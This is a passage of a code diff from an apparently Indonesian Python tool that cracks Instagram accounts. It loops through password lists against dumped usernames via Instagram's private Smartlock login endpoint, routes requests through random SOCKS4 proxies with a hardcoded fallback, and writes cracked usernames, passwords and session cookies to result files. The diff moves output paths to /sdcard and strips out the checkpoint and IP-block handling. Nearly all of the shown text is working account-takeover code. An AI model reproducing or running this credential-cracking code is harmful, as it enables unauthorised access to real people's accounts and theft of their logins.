             except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects): Console().print(f"[grey50]   ──>[red] Koneksi Anda Bermasalah!", end='\r'); time.sleep(31)               
         self.looping+=1
         
     def Exec_Private_Api_Smartlock(self, username, password):
         byps = requests.Session()
-        Console().print(f"[grey50]   ──> ([green](Cracking)[grey50]) — ([blue]{'{:.0%}'.format(self.looping/float(len(dump)))}[grey50]/[blue]{str(len(dump))}[grey50]/[blue]{self.looping}[grey50]) — [grey50]([green]Ok[grey50]:[green]{self.success}[grey50]/[red]2f[grey50]:[red]{self.faktor}[grey50]/[yellow]Cp[grey50]:[yellow]{self.chekpoint}[grey50])", end='\r')  
+        Console().print(f"[grey50]   ──> ([green]{str(username)[:15]}[grey50]) — ([blue]{'{:.0%}'.format(self.looping/float(len(dump)))}[grey50]/[blue]{str(len(dump))}[grey50]/[blue]{self.looping}[grey50]) — [grey50]([green]Ok[grey50]:[green]{self.success}[grey50]/[red]2f[grey50]:[red]{self.faktor}[grey50]/[yellow]Cp[grey50]:[yellow]{self.chekpoint}[grey50])", end='\r')  
         for passwd in password:
             try:
                 byps.headers.update({**Requ().HeadersApiLogin(),
@@ -1309,7 +1234,7 @@ class Instagram:
                     'content-length': str(len(encode)), 'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ]),
                 })              
                 try:
-                    proxy = {'http': 'socks4://'+str(random.choice(open("Penyimpanan/ProxyTS.txt","r").read().splitlines()))}
+                    proxy = {'http': 'socks4://'+str(random.choice(open("/sdcard/ArifXd/ArifXd/Penyimpanan/Proxyts.Txt","r").read().splitlines()))}
                 except (Exception) as e: Console().print(f"[grey50]   ──>[red] {str(e).title()}", end='\r'); proxy = {'http': 'socks4://184.178.172.26:4145'}
                 response = byps.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/', data = encode, proxies = proxy, allow_redirects=True).text
                 self.save_result = self.Simpan_Result()
@@ -1401,7 +1326,7 @@ class Instagram:
                         tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                         printz(tree)
                         save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}|{users}|{fulls}|{response_facebook}\n'
-                    with open('OK/OK-Instagram-'+self.save_result,'a') as wr:
+                    with open('/sdcard/ArifXd/OK/OK-Instagram-'+self.save_result,'a') as wr:
                         wr.write(save)
                         wr.close()
                     break          
@@ -1418,29 +1343,10 @@ class Instagram:
                     printz(tree)
                     save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                     self.faktor+=1
-                    with open('2F/2F-Instagram-'+self.save_result,'a') as wr:
+                    with open('/sdcard/ArifXd/2F/2F-Instagram-'+self.save_result,'a') as wr:
                         wr.write(save)
                         wr.close()   
-                    break 
-                elif 'challenge_required' in str(response.replace('\\','')):
-                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
-                    except (UnboundLocalError) as e: pass
-                    tree = Tree('\r                                             ')
-                    tree = tree.add('╭ [italic yellow]Response Checkpoint')
-                    tree.add(f'[italic white]Username : [yellow]{username}')
-                    tree.add(f'[italic white]Fullname : [yellow]{fullname}')
-                    tree.add(f'[italic white]Password : [yellow]{passwd}')
-                    tree.add(f'[italic white]Profiles : [yellow]{follower}[grey50]/[yellow]{followed}[grey50]/[yellow]{feedpost}')
-                    tree.add(f'[italic white]Useragent : [yellow]{byps.headers["user-agent"]}')
-                    printz(tree)
-                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
-                    self.chekpoint+=1
-                    with open('CP/CP-Instagram-'+self.save_result,'a') as wr:
-                        wr.write(save)
-                        wr.close()
-                    break    
-                elif 'ip_block' in str(response.replace('\\','')):
-                    Console().print(f"[grey50]   ──>[red] Hidupkan Mode Pesawat 5 Detik!!", end='\r')
+                    break
                     time.sleep(3.5)  
                 else: continue   
             except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects): Console().print(f"[grey50]   ──>[red] Koneksi Anda Bermasalah!", end='\r'); time.sleep(31)               
